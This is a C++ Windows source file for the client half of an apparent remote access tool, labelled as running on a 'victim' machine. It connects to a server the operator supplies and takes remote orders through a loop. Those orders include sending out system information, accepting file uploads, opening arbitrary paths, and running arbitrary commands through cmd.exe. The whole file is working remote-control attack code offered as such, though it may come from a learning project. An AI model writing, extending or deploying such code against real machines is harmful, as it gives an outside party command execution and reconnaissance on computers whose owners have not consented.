#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <cstdint>
#include "..\Headers\menu.h"
#include <direct.h>
#include <windows.h> // https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/
#include <sstream>
#include <shellapi.h> // https://learn.microsoft.com/en-us/windows/win32/api/shellapi/
#include "..\Headers\CaesarCipherShift.h"
#include "System-info\info.h"
#include "Receive-File\receiveFile.h"
#include <mmsystem.h>

int main(int argc, char* argv[]) {
    if(argc < 2) {
        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
        return 1;
    }
    sockaddr_in serverAddress;
    WSADATA wsa;
    char buffer[BUFFERSIZE];
    SOCKET sock = INVALID_SOCKET;

    if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //ver 2.2
        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET) {
        std::cout << ERROR_PREFIX << " Socket failed\n";
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Socket created\n";
    }

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(PORT);
    
    std::string serverip = argv[1];

    if(inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr) <= 0) {
        std::cout << ERROR_PREFIX << " Invalid IP address\n";
        return 1;
    }

    if(connect(sock, (sockaddr*) &serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << ERROR_PREFIX << " Connection failed\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    } else {
        std::cout << SUCCESS_PREFIX << " Connection established\n";
    }

    while(true) {
        int type;
        int bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
        if(bytesRec <= 0) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }

        if(type == TYPE_TEXT) {
            memset(buffer, 0, BUFFERSIZE);

            bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
            if(bytesRec <= 0) {
                std::cout << SERVER_STATUS_CLOSED;
                break;
            }
            std::string cmd(buffer);
            std::cout << ATTACKER_LABEL << cmd << std::endl;

            std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
            send(sock, clientMessage.c_str(), clientMessage.size(), 0);
        
        }
        
        if(type == TYPE_FILE) {
            receiveFile(sock, buffer);
        }

        if (type == TYPE_INFO) {
            std::cout << SUCCESS_PREFIX << " Server requested system information\n";
            std::string sysInfo = getSystemInfo();

            int32_t infoLength = sysInfo.length();
            send(sock, (char*)&infoLength, sizeof(infoLength), 0);
            send(sock, sysInfo.c_str(), infoLength, 0);

            std::cout << SUCCESS_PREFIX << " Sent information to the server\n";
        }

        if(type == TYPE_EXECUTE) {
            int subtype;
            bytesRec = recv(sock, (char*)&subtype, sizeof(subtype), 0);

            switch(subtype) {
                case 1: {
                    int32_t pathLen;
                    bytesRec = recv(sock, (char*)&pathLen, sizeof(pathLen), 0);

                    if(bytesRec > 0 && pathLen > 0 && pathLen < 10000) {
                        char* pathBuf = new char[pathLen + 1];
                        bytesRec = recv(sock, pathBuf, pathLen, 0);

                        if(bytesRec > 0) {
                            pathBuf[pathLen] = '\0';
                            std::string path(pathBuf);
                            delete[] pathBuf;

                            std::cout << PENDING_PREFIX << " Opening: '" << path << "'\n";
                            HINSTANCE verify = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWMAXIMIZED); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow

                            bool shellSuccess = (INT_PTR)verify > 32;

                            if(shellSuccess) {
                                std::cout << SUCCESS_PREFIX << " '" << path << "' opened.\n"; 
                            } else {
                                std::cout << ERROR_PREFIX << " '" << path << "' failed to open.\n";
                            }

                            std::string toHostPath = "Successfully opened '" + path + "'.";

                            int32_t msgLen = toHostPath.length();
                            send(sock, (char*)&msgLen, sizeof(msgLen), 0);
                            send(sock, toHostPath.c_str(), msgLen, 0);
                        } else {
                            std::cout << ERROR_PREFIX << " Failed to open path.\n";
                        }
                    } else {
                        std::cout << ERROR_PREFIX << " Failed to receive path.\n"; 
                    }
                    break;
                }
                
                case 2: {
                    int32_t cmdLen;
                    recv(sock, (char*)&cmdLen, sizeof(cmdLen), 0);

                    char *cmdBuf = new char[cmdLen + 1];
                    bytesRec = recv(sock, cmdBuf, cmdLen, 0);

                    if(bytesRec > 0) {
                        cmdBuf[cmdLen] = '\0';
                        std::string cmd(cmdBuf);
                        delete[] cmdBuf;

                        std::cout << PENDING_PREFIX << " Executing cmd: " << cmd << std::endl;

                        HINSTANCE verify = ShellExecuteA(NULL, "open", "cmd.exe", ("/C " + cmd).c_str(), NULL, SW_SHOWMAXIMIZED);

                        bool cmdSuccess = (INT_PTR)verify > 32;

                        if(cmdSuccess) {
                            std::cout << SUCCESS_PREFIX << " '" << cmd << "' command executed.\n";
                        } else {
                            std::cout << ERROR_PREFIX << " '" << cmd << "' command failed to executed.\n";
                        }

                    } else {
                        std::cout << ERROR_PREFIX << " Failed to execute command.\n";
                    }

                    break;
                }
            }

        }

        if(type == TYPE_SOUND) {
            mciSendStringA("stop sound", NULL, 0, 0);
            mciSendStringA("close sound", NULL, 0, 0);
            std::string path;
            path = receiveFile(sock, buffer);
            if(!path.empty()) {
                std::string openFile = "open \"" + path + "\" alias sound";
                mciSendStringA(openFile.c_str(), NULL, 0, 0);
                mciSendStringA("play sound", NULL, 0, 0);
                std::cout << SUCCESS_PREFIX << " Playing: " << path << std::endl;
            }
        }

        if(type == TYPE_EXIT) {
            std::cout << SERVER_STATUS_CLOSED;
            break;
        }
    }
    closesocket(sock);
    WSACleanup();
    return 0;
}